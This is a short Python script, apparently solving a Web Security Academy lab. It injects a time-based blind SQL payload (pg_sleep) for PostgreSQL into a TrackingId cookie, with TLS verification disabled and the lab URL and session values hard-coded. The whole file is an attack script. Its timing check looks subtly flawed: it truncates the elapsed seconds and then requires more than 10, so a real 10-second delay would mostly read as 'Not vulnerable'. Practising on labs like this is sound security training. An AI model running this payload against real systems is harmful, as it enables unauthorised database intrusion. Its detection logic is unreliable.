import sys
import requests
import urllib.parse
import urllib3

#--------------------------------------------------------------------------#
#                                 CHANGEME                                 #
URL = 'https://acc01fa91e694462c04646f800c60061.web-security-academy.net/' #
TRACKING_ID = 'boyTWIpllF5FbfEm'                                           #
SESSION_COOKIE = '1sbGZKU9ZFkHQXQFuwGaQvJ4GkNxvWSC'                        #
#--------------------------------------------------------------------------#

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def time_sqli_check():
        # We are dealing with a PostgreSQL database
        payload = f"' || (SELECT pg_sleep(10))--"
        encoded_payload = urllib.parse.quote(payload)

        cookies = {
            'TrackingId': TRACKING_ID + encoded_payload,
            'session': SESSION_COOKIE
        }

        r = requests.get(URL, cookies=cookies, verify=False)
        time_elapsed = int(r.elapsed.total_seconds())

        if time_elapsed > 10:
            print("Vulnerable")
        else:
            print("Not vulnerable")

if __name__ == "__main__":
    time_sqli_check()
